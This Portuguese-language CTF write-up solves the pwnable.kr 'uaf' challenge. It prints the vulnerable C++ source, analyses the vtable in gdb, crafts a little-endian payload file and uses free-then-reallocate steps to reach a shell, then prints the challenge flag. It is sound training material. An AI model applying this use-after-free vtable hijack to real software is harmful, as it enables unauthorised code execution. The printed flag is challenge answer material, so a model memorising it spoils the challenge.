# Duckware Team - uaf (pwnable)
###### Solved by @Antonio-alexandre

> This CTF is about pwn, use after free

## Desafio: uaf (Pwn, Use After Free)
#### Introdução

Neste desafio, precisaremos analisar e identificar vulnerabilidades em um código a fim de aplicar uma técnica chamada de `Use After Free`, para assim obtermos acesso a um `shell`.

- [Página do desafio](http://pwnable.kr/play.php)

#### Análise Inicial

A princípio, nos deparamos com a seguinte descrição: 

> Mamãe, o que é o bug Use After Free?

Além do seguinte código para conectar ao servidor:

`ssh uaf@pwnable.kr -p2222 (pw:guest)` 

#### Solução

Assim que conectamos ao servidor, nos deparamos com a seguinte tela:

[![Imagem13.png](https://i.postimg.cc/tJV9Jm3W/Imagem13.png)](https://postimg.cc/sGyk0m0g)

De começo, é sempre bom verificar os arquivos presentes na máquina. Ao executar o comando `ls`, nos deparamos com três arquivos:

`flag`  `uaf`  `uaf.cpp`

Antes de mais nada, iremos verificar o código usando o comando cat `uaf.cpp`. Podemos perceber que é um código em c++. Aqui está ele:

```
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```

Logo de cara, ao analisar a classe `Human`, podemos identificar o trecho que dá acesso ao shell para o usuário. Precisaremos então identificar uma maneira de acessar esse método.

Nosso primeiro passo é identificar o endereço de memória da função `main`. Para isso, utilizaremos o comando:

`objdump -d uaf | grep '<main>'`

Esse comando, nos retornou o seguinte endereço:

`0000000000400ec4 <main>:`

Então, basta executar o `gdb`, e inserir um `breakpoint` no endereço de memória concebido.

[![Imagem14.png](https://i.postimg.cc/h40kbnjv/Imagem14.png)](https://postimg.cc/14f7sLD1)

Com o nosso `breakpoint` setado, basta executar o código com o comando `run`. Feito isso, ativaremos o [disassembler](https://juniorinformaticacps.com.br/glossario/o-que-e-disassembler/):

Para isso, utilizaremos dois comandos:

```
(gdb) set disassembly-flavor intel
(gdb) layout asm
```

Ao executar esses dois comandos, nos deparamos com a seguinte tabela:

[![Imagem15.png](https://i.postimg.cc/vBtNz7Gk/Imagem15.png)](https://postimg.cc/G89K3y8x)

Analisando mais profundamente, podemos perceber duas coisas no seguinte trecho:

[![Imagem16.png](https://i.postimg.cc/xjgZNPxb/Imagem16.png)](https://postimg.cc/rz0jv5L8)

Nesse trecho, o `cmp` implementa o `caso 1` no código, e o `je` pula para o trecho do código que é responsável por chamar a função `introduce()`, e executar a função [VFT (Virtual Function Table)](https://www.learncpp.com/cpp-tutorial/the-virtual-table/)

[![Imagem17.png](https://i.postimg.cc/MGk3J3Tg/Imagem17.png)](https://postimg.cc/Hr29Q2bt)

A parte que mais nos importa é `add rax,0x8`, pois ela pega o primeiro valor da VFT em `rax` e incrementa 8 bytes para obter o endereço de `introduce()`. Então, se colocarmos um breakpoint aqui, obteremos o endereço de `rax`.

[![Imagem18.png](https://i.postimg.cc/cHkQ06h6/Imagem18.png)](https://postimg.cc/2bvqxkPf)

Basta então obter o nosso VFT:

[![Imagem19.png](https://i.postimg.cc/Fz23kq24/Imagem19.png)](https://postimg.cc/p5Jpg0WG)

Agora que temos o endereço do VFT, podemos criar o nosso [payload](https://blog.starti.com.br/payload-o-que-e/). Lembrando que precisaremos subtrair 8 bytes do endereço, e após isso inverter a posição deles, por conta de ser um código little endian. Para isso, executaremos o seguinte código:

`echo -e '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/uafattack`

Após isso, basta executar o seguinte comando:

`./uaf 8 /tmp/uafattack`

Após isso, ele abrirá o seguinte terminal:

[![Imagem20.png](https://i.postimg.cc/sfBn1Rhb/Imagem20.png)](https://postimg.cc/mhs36JVS)

Após isso, precisaremos desalocar a memória com a opção 3, e utilizar uma técnica chamada de [Heap Spray](https://en.wikipedia.org/wiki/Heap_spraying). O que essa técnica faz é alocar a memória repetidas vezes com a esperança que caia em algum lugar detectável (no nosso caso, onde `m` costumava ser). Para isso, basta repetir os passos:

Ao executar esse passo a passo perfeitamente, basta executar o comando `cat flag`.

Assim então, temos acesso a `flag`:

>`yay_f1ag_aft3r_pwning`
 
